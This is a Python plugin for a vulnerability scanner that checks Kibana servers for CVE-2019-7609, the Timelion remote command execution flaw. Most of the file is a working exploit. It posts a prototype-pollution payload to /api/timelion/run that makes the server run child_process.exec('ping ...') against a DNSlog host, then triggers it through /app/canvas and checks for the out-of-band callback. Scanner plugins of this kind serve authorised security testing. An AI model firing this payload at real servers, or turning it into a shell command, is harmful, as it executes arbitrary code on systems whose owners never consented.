#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
import requests
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,randoms,Dnslog,ErrorHandling,Proxies
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2019-7609" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-12-4"  # 插件编辑时间
        self.info['disclosure'] = '2019-11-07'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "KibanaRemoteCommandExecutionVulnerability"  # 插件名称
        self.info['name'] ='Kibana远程命令执行漏洞' #漏洞名称
        self.info['affects'] = "Kibana"  # 漏洞组件
        self.info['desc_content'] = "拥有Kibana的Timelion模块访问权限的人可以以Kibana的运行权限执行任意代码，包括反弹shell。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "影响版本为5.6.15和6.6.0之前的所有版本"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Kibana版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        DL=Dnslog()
        payload_url1 = scheme + '://' + url + ':' + str(port) + "/api/timelion/run"
        payload_url2 = scheme + '://' + url + ':' + str(port) + '/app/canvas'
        payload_post = '''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"ping  %s\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}''' % DL.dns_host()
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/json;charset=utf-8',
            'Referer': scheme+'://'+url+':'+str(port)+'/app/timelion',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        }
        resp = requests.post(payload_url1, headers=headers,proxies=proxies, data=payload_post, timeout=5, verify=False)
        resp2 = requests.get(payload_url2, headers=headers,proxies=proxies, timeout=5, verify=False)
        if DL.result():
            Medusa = "{} 存在Kibana远程命令执行漏洞(CVE-2019-7609)\r\n 验证数据:\r\n漏洞位置:{}\r\nDNSlog内容:{}\r\n".format(url,
                                                                                                          payload_url1,
                                                                                                          DL.dns_host(),)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类